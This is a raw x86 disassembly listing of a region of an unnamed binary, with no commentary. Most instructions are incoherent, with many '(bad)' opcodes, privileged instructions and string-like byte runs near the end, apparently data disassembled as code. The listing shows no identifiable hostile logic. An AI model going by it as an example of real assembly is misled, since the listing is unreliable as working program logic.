  4331fa:	inc    ebp
  4331fb:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433201:	fadd   QWORD PTR [ebx]
  433203:	inc    ebp
  433204:	or     al,0x33
  433206:	dec    ebp
  433207:	add    edi,DWORD PTR [ebx]
  433209:	mov    DWORD PTR [edx-0x28],esi
  43320c:	mov    eax,DWORD PTR [ebp-0x10]
  43320f:	mov    eax,DWORD PTR [eax+0x10]
  433212:	mov    eax,edi
  433214:	lock ret 
  433216:	inc    ecx
  433217:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43321d:	fsubr  st,st(5)
  43321f:	test   DWORD PTR [eax],eax
  433221:	clc    
  433222:	push   0x45
  433224:	(bad)  
  433225:	cmp    al,0xec
  433227:	pushf  
  433228:	inc    ebp
  433229:	(bad)  
  43322a:	push   eax
  43322b:	fsub   DWORD PTR [eax-0x7b]
  43322e:	(bad)  
  43322f:	clc    
  433230:	mov    eax,0xf8008584
  433235:	mov    eax,DWORD PTR [ebp-0x4]
  433238:	mov    edi,0x4585c3cc
  43323e:	clc    
  43323f:	mov    eax,DWORD PTR [ebp+0x14]
  433242:	xor    eax,DWORD PTR [ebp-0x64]
  433245:	mov    edi,eax
  433247:	in     al,dx
  433248:	les    esi,FWORD PTR [ebp-0x7b]
  43324b:	mov    edi,eax
  43324d:	or     al,0x4d
  43324f:	dec    ebp
  433250:	mov    eax,ebp
  433252:	in     al,0xf2
  433254:	dec    ebp
  433255:	dec    DWORD PTR [ecx+0x4dc7e045]
  43325b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433261:	inc    ebp
  433262:	mov    DWORD PTR [ebx],esi
  433264:	fadd   QWORD PTR [ebx]
  433266:	dec    ebp
  433267:	push   eax
  433268:	xor    eax,DWORD PTR [ebp+0x3]
  43326b:	push   eax
  43326c:	mov    DWORD PTR [eax+ebx*8],ebx
  43326f:	push   esi
  433271:	mov    eax,DWORD PTR [eax]
  433273:	lock cmp eax,0xf84e85c0
  433279:	inc    ebp
  43327a:	test   BYTE PTR [ebx],dh
  43327c:	add    DWORD PTR [ebx],eax
  43327e:	add    BYTE PTR [eax+0x4d],dl
  433281:	jne    0x4332b6
  433283:	lea    ecx,[ebx-0x7617fc44]
  433289:	div    ah
  43328b:	inc    DWORD PTR [ebp+0x45]
  43328e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433294:	jb     0x433221
  433296:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43329d:	mov    ecx,DWORD PTR [ebp-0x10]
  4332a0:	xor    ecx,DWORD PTR [ebp+0x3]
  4332a3:	mov    edi,DWORD PTR [ebx]
  4332a5:	adc    BYTE PTR [ebp+0x41],dh
  4332a8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4332ae:	ret    
  4332af:	push   ss
  4332b0:	push   0x45
  4332b2:	lea    ecx,[ebx+0x4de80cb0]
  4332b8:	sti    
  4332b9:	add    edi,edi
  4332bb:	or     BYTE PTR [ebp+0x4d],al
  4332be:	mov    ebp,DWORD PTR [ebx]
  4332c0:	xor    ebp,ecx
  4332c2:	mov    al,BYTE PTR [edx]
  4332c4:	add    eax,0xc7200
  4332c9:	jne    0x433318
  4332cb:	lea    esi,[ebx]
  4332cd:	mov    al,0xf
  4332cf:	call   0xf2994
  4332d4:	shl    DWORD PTR [ecx],0x84
  4332d7:	pushf  
  4332d8:	add    DWORD PTR [ecx+0x4545d000],ecx
  4332de:	mov    esi,DWORD PTR [edx]
  4332e0:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4332e7:	test   DWORD PTR [eax],eax
  4332e9:	clc    
  4332ea:	dec    ebp
  4332eb:	inc    ebp
  4332ec:	xor    edi,DWORD PTR [edi+ecx*1]
  4332ef:	pushf  
  4332f0:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4332f7:	lea    eax,[ecx]
  4332f9:	int3   
  4332fa:	add    BYTE PTR [ebp+0x45],cl
  4332fd:	lea    ecx,[ebx-0x75b2cc38]
  433303:	lea    eax,ds:0x4d72c4
  433309:	mov    ecx,DWORD PTR [ebp-0x4]
  43330c:	xor    ecx,edi
  43330e:	bswap  ebx
  433310:	ror    BYTE PTR [ebp-0x35],0xe9
  433314:	rol    DWORD PTR [ecx],0x84
  433317:	add    BYTE PTR [ecx],al
  433319:	xor    eax,DWORD PTR [eax]
  43331b:	pushf  
  43331c:	inc    ebp
  43331d:	jnp    0x8a436720
  433323:	mov    eax,DWORD PTR ds:0xcf72e8
  433329:	lock dec ebp
  43332b:	retf   
  43332c:	xor    ecx,DWORD PTR [ebp+0xf]
  43332f:	mov    eax,eax
  433331:	fmul   st,st(3)
  433333:	test   ecx,0x19b8484
  433339:	xor    al,BYTE PTR [eax]
  43333b:	mov    DWORD PTR [ebp-0x28],eax
  43333e:	mov    eax,DWORD PTR [ebp+0x33]
  433341:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433347:	ret    
  433348:	add    al,cl
  43334a:	dec    ebp
  43334b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433351:	add    ecx,DWORD PTR ds:0xc7250
  433357:	inc    ebp
  433358:	rcl    DWORD PTR [eax+0x4d],0x2b
  43335c:	mov    edi,edi
  43335e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433364:	jb     0x43332d
  433366:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  43336d:	mov    esi,DWORD PTR [ebx]
  43336f:	cld    
  433370:	mov    cl,bh
  433372:	or     eax,0x372b6
  433377:	cmp    ecx,eax
  433379:	jne    0x4333f6
  43337f:	mov    eax,DWORD PTR [ebp-0x20]
  433382:	mov    eax,DWORD PTR [eax]
  433384:	xor    eax,edi
  433386:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  43338d:	mov    ecx,DWORD PTR [ebp-0x4]
  433390:	mov    ecx,edi
  433392:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433398:	jb     0x4333a9
  43339a:	add    BYTE PTR [edi-0x3f],dl
  43339d:	add    BYTE PTR [ebp-0x75],cl
  4333a0:	mov    esi,eax
  4333a2:	xor    eax,DWORD PTR [eax]
  4333a4:	mov    al,bh
  4333a6:	or     eax,0x4b7284
  4333ab:	xor    al,cl
  4333ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4333b0:	mov    ecx,edi
  4333b2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4333b8:	jb     0x4333c9
  4333ba:	add    BYTE PTR [edi],dh
  4333bc:	enter  0x8500,0x8b
  4333c0:	add    ah,bl
  4333c2:	add    BYTE PTR [eax],al
  4333c4:	inc    ebp
  4333c5:	(bad)  
  4333c6:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4333cd:	mov    esi,DWORD PTR [edx-0x4]
  4333d0:	add    bh,cl
  4333d2:	dec    ebp
  4333d3:	mov    dh,0x8b
  4333d5:	add    esi,DWORD PTR [ebx]
  4333d7:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4333dd:	add    BYTE PTR [eax],al
  4333df:	mov    eax,ecx
  4333e1:	loopne 0x433430
  4333e3:	add    BYTE PTR [ebx-0x757bcc39],cl
  4333e9:	dec    ebx
  4333ea:	or     eax,0x8b7232
  4333ef:	in     al,0xc1
  4333f1:	or     DWORD PTR [ebp-0x31],ecx
  4333f4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4333fb:	xor    dh,BYTE PTR [edx-0x75]
  4333fe:	add    al,dh
  433400:	enter  0x4f09,0xcf
  433404:	inc    ebp
  433405:	mov    WORD PTR [ebx-0x75cdccb5],cs
  43340b:	or     al,BYTE PTR ds:0xe4728b
  433411:	or     DWORD PTR [ebp-0x31],ecx
  433414:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  43341b:	cmp    dh,BYTE PTR [edx+0xf]
  43341e:	add    bl,dl
  433420:	rol    DWORD PTR [eax],0x4d
  433423:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433429:	(bad)  
  43342a:	or     eax,0x4b7284
  43342f:	xor    al,cl
  433431:	mov    ecx,DWORD PTR [ebp-0x20]
  433434:	mov    ecx,DWORD PTR [ecx]
  433436:	xor    ecx,edi
  433438:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43343f:	xor    cl,al
  433441:	mov    ecx,DWORD PTR [edi]
  433443:	fadd   QWORD PTR [ebp+0x9]
  433446:	call   0xffd02f1a
  43344b:	dec    ebx
  43344c:	dec    ebp
  43344d:	xor    bh,BYTE PTR [ebx]
  43344f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433453:	loopne 0x433451
  433455:	or     edi,eax
  433457:	iret   
  433458:	ret    
  433459:	mov    WORD PTR [ebp+0x4f],es
  43345c:	mov    esi,DWORD PTR [edx]
  43345e:	call   0x8452fb9d
  433463:	(bad)  
  433464:	fwait
  433465:	add    BYTE PTR [edx],dh
  433467:	mov    esi,DWORD PTR [ebx]
  433469:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43346f:	test   BYTE PTR [ebx],dh
  433471:	dec    ebx
  433472:	add    esi,DWORD PTR [edx]
  433474:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43347a:	dec    edi
  43347c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  433483:	xor    al,BYTE PTR [ebx]
  433485:	mov    edi,DWORD PTR [ebx]
  433487:	in     al,0x75
  433489:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43348f:	dec    ebx
  433490:	xor    esi,DWORD PTR [edx]
  433492:	lea    ecx,[edx]
  433494:	or     BYTE PTR [ebx+0x900f072],cl
  43349a:	ja     0x43346b
  43349c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  4334a3:	cmp    ch,al
  4334a5:	jne    0x43349a
  4334a7:	mov    edi,edi
  4334a9:	fadd   QWORD PTR [ebp+0x0]
  4334ac:	mov    eax,edi
  4334ae:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4334b5:	mov    edx,DWORD PTR [ebx]
  4334b7:	in     al,0x45
  4334b9:	or     DWORD PTR [ebx],esi
  4334bb:	iret   
  4334bc:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4334c3:	xor    dl,BYTE PTR [eax-0x75]
  4334c6:	sbb    al,0xe0
  4334c8:	dec    DWORD PTR [ecx]
  4334ca:	mov    ecx,edi
  4334cc:	in     al,dx
  4334cd:	mov    eax,es
  4334cf:	dec    ebx
  4334d0:	mov    DWORD PTR [edx],esi
  4334d2:	fmul   QWORD PTR [edx]
  4334d4:	jne    0x433461
  4334d6:	(bad)  
  4334d7:	(bad)  
  4334d9:	or     DWORD PTR [ebp-0x31],eax
  4334dc:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4334e3:	cmp    bh,bh
  4334e5:	jne    0x43352c
  4334e7:	lea    ecx,[ebx-0x38372750]
  4334ed:	inc    ebx
  4334ef:	mov    eax,ecx
  4334f1:	mov    eax,0xa00c111
  4334f6:	jne    0x43353d
  4334f8:	mov    esi,DWORD PTR [ebx]
  4334fa:	test   al,0x3
  4334fc:	inc    ebp
  4334fd:	mov    DWORD PTR [eax-0xc],edx
  433500:	loop   0x433547
  433502:	push   DWORD PTR [ebx]
  433504:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43350a:	add    DWORD PTR [eax],eax
  43350c:	mov    eax,edi
  43350e:	lods   al,BYTE PTR ds:[esi]
  43350f:	dec    ebp
  433510:	inc    ebp
  433511:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433517:	retf   
  433518:	mov    edx,ecx
  43351a:	adc    al,0x84
  43351c:	(bad)  
  43351d:	std    
  43351e:	ret    
  43351f:	jmp    FWORD PTR [edi-0x2b7474bb]
  433525:	hlt    
  433526:	rol    edi,0x82
  433529:	ret    
  43352a:	cld    
  43352b:	enter  0x11ff,0x45
  43352f:	inc    ebp
  433530:	pop    edi
  433531:	mov    ebx,DWORD PTR [ebx+0x14]
  433534:	ret    0xc7
  433537:	test   BYTE PTR [ebx+0x4532519b],cl
  43353d:	jmp    0x4334ca
  43353f:	push   0x8
  433541:	call   DWORD PTR [esi]
  433543:	in     al,dx
  433544:	add    BYTE PTR [ebp+0x1],0x50
  433548:	add    bh,ah
  43354a:	add    bh,bh
  43354c:	icebp  
  43354d:	mov    ecx,DWORD PTR [eax]
  43354f:	cld    
  433550:	pop    es
  433551:	dec    ebp
  433552:	shl    DWORD PTR [ebx],0x72
  433555:	add    eax,DWORD PTR [eax]
  433557:	cmp    edx,ecx
  433559:	je     0x43356b
  43355b:	mov    esi,DWORD PTR [ebp-0x4]
  43355e:	inc    edi
  433560:	or     al,0xc3
  433562:	jmp    FWORD PTR [edx-0x18]
  433565:	(bad)  
  433566:	sti    
  433567:	cwde   
  433568:	(bad)  
  433569:	call   0xffa12e74
  43356e:	or     al,0x45
  433570:	push   ebp
  433571:	sub    esp,0x18
  433574:	push   ebx
  433575:	inc    ebp
  433576:	mov    edi,edi
  433578:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43357f:	test   al,0x54
  433581:	inc    ebp
  433582:	push   ecx
  433583:	push   eax
  433584:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43358a:	add    ah,bh
  43358c:	(bad)  
  43358d:	dec    ebp
  43358e:	add    DWORD PTR [ebx],esi
  433590:	inc    ebp
  433591:	add    ecx,DWORD PTR [ebx+0x74943b]
  433597:	push   0xffffff8b
  433599:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43359f:	add    eax,DWORD PTR [ecx]
  4335a1:	or     BYTE PTR [eax],al
  4335a3:	call   0xff852da8
  4335a8:	mov    eax,DWORD PTR [ebp+0x14]
  4335ab:	mov    ecx,DWORD PTR [ecx+0x801ac]
  4335b1:	inc    ebp
  4335b2:	dec    ecx
  4335b3:	add    ebp,DWORD PTR [edx+0x14]
  4335b6:	push   0x8b3045
  4335bb:	call   0x33ad8330
  4335c0:	inc    DWORD PTR [ebx]
  4335c2:	mov    DWORD PTR [edi],ecx
  4335c4:	mov    eax,ecx
  4335c6:	or     BYTE PTR [ebp-0x3d],cl
  4335c9:	cmp    eax,edi
  4335cb:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4335d0:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4335d6:	adc    al,0xc9
  4335d8:	inc    ebp
  4335d9:	adc    BYTE PTR [eax+0x55],dl
  4335dc:	jne    0x4335ca
  4335de:	call   0xff54356e
  4335e3:	dec    ebp
  4335e4:	inc    ebp
  4335e5:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4335eb:	add    BYTE PTR [ebx],bh
  4335ed:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4335f1:	push   esp
  4335f2:	or     al,0x51
  4335f4:	dec    ebp
  4335f5:	xor    DWORD PTR [ebx],0xf32039b
  4335fb:	cmp    eax,DWORD PTR [ebp+0x74]
  4335fe:	mov    edi,edi
  433600:	pop    edi
  433601:	adc    BYTE PTR [ebx+0x75],bl
  433604:	ret    0x50
  433607:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43360b:	(bad)  
  43360c:	clc    
  43360d:	mov    esp,ebp
  43360f:	pop    ecx
  433610:	mov    ecx,0xf80085c2
  433615:	mov    ecx,DWORD PTR [ecx+edx*2]
  433618:	push   esi
  433619:	push   esi
  43361a:	(bad)  
  43361b:	lock add DWORD PTR [ebp+0x44],eax
  43361f:	mov    edx,DWORD PTR [eax]
  433621:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433625:	or     BYTE PTR [edi+eax*1+0x51],dl
  433629:	ret    
  43362a:	xor    ebx,DWORD PTR [ebx+0x37232be]
  433630:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433636:	or     al,0x80
  433638:	jge    0x43363b
  43363a:	mov    DWORD PTR [eax],eax
  43363c:	and    al,0x8
  43363e:	cmp    DWORD PTR [ebp+0x10],eax
  433641:	mov    edx,DWORD PTR [esi]
  433643:	xchg   esp,eax
  433644:	dec    esp
  433645:	add    BYTE PTR [eax],dl
  433647:	mov    ecx,edx
  433649:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43364d:	dec    ebp
  43364e:	into   
  43364f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433655:	mov    edx,DWORD PTR [eax+0x14]
  433658:	das    
  433659:	add    al,0x45
  43365b:	add    BYTE PTR [ebp+0x0],dh
  43365e:	mov    edi,edi
  433660:	and    al,0x50
  433662:	mov    eax,DWORD PTR [eax]
  433664:	and    al,0xd1
  433666:	xor    eax,DWORD PTR [esi]
  433668:	lea    eax,[ebp+0x8]
  43366b:	xor    esi,DWORD PTR [edx+0x3]
  43366e:	add    BYTE PTR [ecx+0x4510fc44],cl
  433674:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  43367a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433684:	cmp    al,0xff
  433686:	pushf  
  433687:	mov    edi,edi
  433689:	or     BYTE PTR [esi+ecx*1],cl
  43368c:	jne    0x433651
  43368e:	call   0xc365a
  433693:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433697:	mov    ebx,DWORD PTR [eax]
  433699:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43369d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4336a5:	pop    esi
  4336a6:	and    al,0xc9
  4336a8:	call   DWORD PTR [eax]
  4336aa:	and    al,0x55
  4336ac:	call   0x28359d
  4336b1:	add    DWORD PTR [eax+edx*1+0xc],0x31
  4336b6:	clc    
  4336b7:	pushf  
  4336b8:	dec    DWORD PTR [ecx+0x57892474]
  4336be:	jmp    0x433701
  4336c0:	and    al,0x89
  4336c2:	and    al,0x24
  4336c4:	or     BYTE PTR [ebx-0x45ebdbe8],cl
  4336ca:	dec    DWORD PTR [eax]
  4336cc:	and    al,0x7
  4336ce:	pop    esi
  4336cf:	cli    
  4336d0:	in     eax,0x9b
  4336d2:	ret    0x32
  4336d5:	add    eax,edx
  4336d7:	mov    DWORD PTR [ebx+0x688b8924],ebx
  4336dd:	or     al,0xf8
  4336df:	jl     0x43375e
  4336e1:	adc    al,0x9c
  4336e3:	dec    ebp
  4336e4:	push   0xff8b7575
  4336e9:	and    al,0xff
  4336eb:	xor    edi,edi
  4336ed:	mov    esi,DWORD PTR [esp-0x75]
  4336f1:	add    ecx,DWORD PTR [ebx+0x4cca0c0f]
  4336f7:	or     bl,ch
  4336f9:	cmp    DWORD PTR [eax],edx
  4336fb:	sbb    al,0x44
  4336fd:	or     BYTE PTR [eax+edx*1-0x7c],cl
  433701:	xor    ah,BYTE PTR [eax*4-0x7a8accf2]
  433708:	or     BYTE PTR [ecx*4+0x5d5fbf74],ah
  43370f:	test   eax,0x83001010
  433714:	dec    eax
  433715:	adc    BYTE PTR [eax],al
  433717:	adc    edi,DWORD PTR [edx+0x10]
  43371a:	add    cl,bh
  43371c:	jae    0x43372e
  43371e:	add    BYTE PTR [ebx-0x4bffefb4],dh
  433724:	pop    eax
  433725:	adc    BYTE PTR [eax],al
  433727:	fidiv  DWORD PTR [ebp+0x10]
  43372a:	add    dh,bl
  43372c:	movups xmm0,XMMWORD PTR [eax]
  43372f:	popf   
  433730:	push   cs
  433731:	adc    BYTE PTR [eax],al
  433733:	ins    DWORD PTR es:[edi],dx
  433734:	or     BYTE PTR [eax],dl
  433736:	add    BYTE PTR [ebx+eiz*2+0x370f0010],cl
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [ebx],dl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [edi],dl
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [ebx],bl
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [edi],bl
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [ebx],ah
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [edi],ah
  433754:	aaa    
  433755:	inc    ebx
  433756:	add    BYTE PTR [ebx],ch
  433758:	aaa    
  433759:	inc    ebx
  43375a:	add    BYTE PTR [edi],ch
  43375c:	aaa    
  43375d:	inc    ebx
  43375e:	add    BYTE PTR [ebx],dh
  433760:	aaa    
  433761:	inc    ebx
  433762:	add    BYTE PTR [edi],dh
  433764:	aaa    
  433765:	inc    ebx
  433766:	add    BYTE PTR [ebx-0x73ffefdd],bh
  43376c:	cmp    al,0x10
  43376e:	add    BYTE PTR [ebx+0x30],cl
  433771:	adc    BYTE PTR [eax],al
  433773:	sub    al,0xc
  433775:	adc    BYTE PTR [eax],al
  433777:	push   ds
  433778:	adc    BYTE PTR ds:[eax],al
  43377b:	mov    bh,0x56
  43377d:	adc    BYTE PTR [eax],al
  43377f:	adc    eax,DWORD PTR [eax+edx*1+0x0]
  433783:	cmp    al,0x4f
  433785:	adc    BYTE PTR [eax],al
  433787:	addr16 aaa 
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    BYTE PTR [ebx+0x37],dh
  433795:	inc    ebx
  433796:	add    BYTE PTR [edi+0x37],dh
  433799:	inc    ebx
  43379a:	add    BYTE PTR [ebx+0x37],bh
  43379d:	inc    ebx
  43379e:	add    BYTE PTR [edi+0x37],bh
  4337a1:	inc    ebx
  4337a2:	add    BYTE PTR [ebx-0x23ffbcc9],al
  4337a8:	pop    esp
  4337a9:	adc    BYTE PTR [eax],al
  4337ab:	jle    0x4337cd
  4337ad:	adc    BYTE PTR [eax],al
  4337af:	cld    
  4337b0:	dec    edx
  4337b1:	adc    BYTE PTR [eax],al
  4337b3:	add    al,0xb
  4337b5:	adc    BYTE PTR [eax],al
  4337b7:	push   ebx
  4337b8:	ins    DWORD PTR es:[edi],dx
  4337b9:	adc    BYTE PTR [eax],al
  4337bb:	fs jl  0x4337ce
  4337be:	add    BYTE PTR [edx+0x42001015],ah
  4337c4:	jge    0x4337d6
  4337c6:	add    BYTE PTR [edi-0x54ffbcc9],ah
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [edi-0x4cffbcc9],ch
  4337d4:	aaa    
  4337d5:	inc    ebx
  4337d6:	add    BYTE PTR [edi-0x44ffbcc9],dh
  4337dc:	aaa    
  4337dd:	inc    ebx
  4337de:	add    BYTE PTR [edi-0x3cffbcc9],bh
  4337e4:	aaa    
  4337e5:	inc    ebx
  4337e6:	add    BYTE PTR [edi+0x2300103a],ah
  4337ec:	aas    
  4337ed:	adc    BYTE PTR [eax],al
  4337ef:	jne    0x4337fc
  4337f1:	adc    BYTE PTR [eax],al
  4337f3:	fldenv [esi]
  4337f5:	adc    BYTE PTR [eax],al
  4337f7:	xchg   esp,eax
  4337f8:	push   0x10
  4337fa:	add    bl,ah
  4337fc:	pop    eax
  4337fd:	adc    BYTE PTR [eax],al
  4337ff:	in     al,0x2f
  433801:	adc    BYTE PTR [eax],al
  433803:	leave  
  433804:	sbb    DWORD PTR [eax],edx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    bl,dh
  433814:	aaa    
  433815:	inc    ebx
  433816:	add    bh,dh
  433818:	aaa    
  433819:	inc    ebx
  43381a:	add    bl,bh
  43381c:	aaa    
  43381d:	inc    ebx
  43381e:	add    bh,bh
  433820:	aaa    
  433821:	inc    ebx
  433822:	add    BYTE PTR [ebx],al
  433824:	cmp    BYTE PTR [ebx+0x0],al
  433827:	mov    ebp,0x1d001062
  43382c:	adc    BYTE PTR [eax],dl
  43382e:	add    BYTE PTR [edi+0x51],dl
  433831:	adc    BYTE PTR [eax],al
  433833:	dec    eax
  433834:	ins    DWORD PTR es:[edi],dx
  433835:	adc    BYTE PTR [eax],al
  433837:	mov    eax,DWORD PTR [edi]
  433839:	adc    BYTE PTR [eax],al
  43383b:	mov    ah,0x7
  43383d:	adc    BYTE PTR [eax],al
  43383f:	ror    DWORD PTR [esi],1
  433841:	adc    BYTE PTR [eax],al
  433843:	pop    edi
  433844:	inc    ebp
  433845:	adc    BYTE PTR [eax],al
  433847:	daa    
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	xor    edi,DWORD PTR [eax]
  433855:	inc    ebx
  433856:	add    BYTE PTR [edi],dh
  433858:	cmp    BYTE PTR [ebx+0x0],al
  43385b:	cmp    edi,DWORD PTR [eax]
  43385d:	inc    ebx
  43385e:	add    BYTE PTR [edi],bh
  433860:	cmp    BYTE PTR [ebx+0x0],al
  433863:	inc    ebx
  433864:	cmp    BYTE PTR [ebx+0x0],al
  433867:	dec    ecx
  433868:	ss push eax
  43386a:	pop    edi
  43386b:	ss inc ebx
  43386d:	ss pop edx
  43386f:	xor    ebx,DWORD PTR [edi+0x52]
  433872:	add    BYTE PTR [edi+ecx*2+0x32],dl
  433876:	pop    edi
  433877:	dec    esi
  433878:	dec    esp
  433879:	dec    eax
  43387a:	xor    esi,DWORD PTR [edx]
  43387c:	pop    edi
  43387d:	xor    al,0x4b
  43387f:	add    BYTE PTR [eax+0x49],cl
  433882:	push   ebp
  433883:	xor    al,0x5f
  433885:	dec    esp
  433886:	inc    edx
  433887:	dec    ecx
  433888:	cmp    DWORD PTR [edi+ebx*2],esi
  43388b:	pop    ecx
  43388c:	inc    edi
  43388d:	add    BYTE PTR [eax+0x50],bl
  433890:	dec    eax
  433891:	pop    edi
  433892:	push   ebp
  433893:	push   ecx
  433894:	inc    edi
  433895:	xor    cl,BYTE PTR [edx+0x38]
  433898:	push   esi
  433899:	add    BYTE PTR [ebx+0x4a],al
  43389c:	push   edx
  43389d:	pop    edi
  43389e:	dec    edi
  43389f:	dec    eax
  4338a0:	dec    edi
  4338a1:	dec    edi
  4338a2:	dec    edx
  4338a3:	add    BYTE PTR [ecx+0x52],al
  4338a6:	cmp    DWORD PTR [edi+0x56],ebx
  4338a9:	aaa    
  4338aa:	dec    esp
  4338ab:	cmp    DWORD PTR [ebx+0x5f],eax
  4338ae:	push   edx
  4338af:	inc    esp
  4338b0:	add    BYTE PTR [ecx+0x37],bl
  4338b3:	inc    esp
  4338b4:	pop    edi
  4338b5:	dec    ecx
  4338b6:	xor    esi,DWORD PTR [edi]
  4338b8:	xor    DWORD PTR [edi+0x49],ebx
  4338bb:	push   esp
  4338bc:	xor    eax,DWORD PTR [eax]
  4338be:	push   edx
  4338bf:	xor    BYTE PTR [eax+0x5f],bl
  4338c2:	dec    eax
  4338c3:	push   edi
  4338c4:	inc    esi
  4338c5:	xor    DWORD PTR [edi+0x5f],edx
  4338c8:	cmp    BYTE PTR [ebx+0x37],dl
  4338cb:	add    BYTE PTR [esi+0x42],dl
  4338ce:	dec    ecx
  4338cf:	xor    ebx,DWORD PTR [edi+0x45]
  4338d2:	xor    BYTE PTR [ebp+0x5f],cl
  4338d5:	xor    al,0x34
  4338d7:	xor    BYTE PTR [edx+0x5f],cl
  4338da:	inc    edi
  4338db:	add    BYTE PTR [edx+0x57],dl
  4338de:	xor    ebx,DWORD PTR [edi+0x31]
  4338e1:	dec    edx
  4338e2:	push   edi
  4338e3:	xor    eax,0x4d435f
  4338e8:	dec    ecx
  4338e9:	xor    eax,0x36365f39
  4338ee:	dec    eax
  4338ef:	xor    BYTE PTR [eax],al
  4338f1:	dec    edi
  4338f2:	inc    ebx
  4338f3:	push   edi
  4338f4:	pop    edi
  4338f5:	inc    edi
  4338f6:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  4338fb:	add    BYTE PTR [edx+0x0],al
  4338fe:	pop    eax
  4338ff:	add    BYTE PTR [edi+0x0],al
  433902:	add    BYTE PTR ss:[edi+0x0],bl
  433906:	push   esi
  433907:	add    BYTE PTR [ebx+0x0],al
  43390a:	dec    esi
  43390b:	add    BYTE PTR [eax+eax*1+0x0],al
  43390f:	add    BYTE PTR [edi+0x0],cl
  433912:	dec    ebp
  433913:	add    BYTE PTR [edi+0x0],al
  433916:	xor    eax,DWORD PTR [eax]
  433918:	pop    edi
  433919:	add    BYTE PTR [eax+eax*1],dh
  43391c:	dec    esi
  43391d:	add    BYTE PTR [edx+0x0],bl
  433920:	cmp    BYTE PTR [eax],al
  433922:	pop    edi
  433923:	add    BYTE PTR [eax+0x0],bl
  433926:	cmp    BYTE PTR [eax],al
  433928:	add    BYTE PTR [eax],al
  43392a:	push   edx
  43392b:	add    BYTE PTR [eax+0x0],bl
  43392e:	push   ecx
  43392f:	add    BYTE PTR [edi+0x0],bl
  433932:	dec    esp
  433933:	add    BYTE PTR [edx+0x0],dl
  433936:	dec    ecx
  433937:	add    BYTE PTR [edi+0x0],cl
  43393a:	inc    esp
  43393b:	add    BYTE PTR [edi+0x0],bl
  43393e:	dec    edi
  43393f:	add    BYTE PTR [ebx],dh
  433941:	add    BYTE PTR [eax+eax*1+0x0],al
  433945:	add    BYTE PTR [ebx+0x0],al
  433948:	push   eax
  433949:	add    BYTE PTR [ebp+0x0],al
  43394c:	pop    edi
  43394d:	add    BYTE PTR ds:0x39004500,dh
  433953:	add    BYTE PTR [edi+0x0],bl
  433956:	push   esi
  433957:	add    BYTE PTR [eax],al
  433959:	add    BYTE PTR [edi+0x0],al
  43395c:	dec    esi
  43395d:	add    BYTE PTR [esi+0x0],dl
  433960:	pop    edi
  433961:	add    BYTE PTR [edi+0x0],al
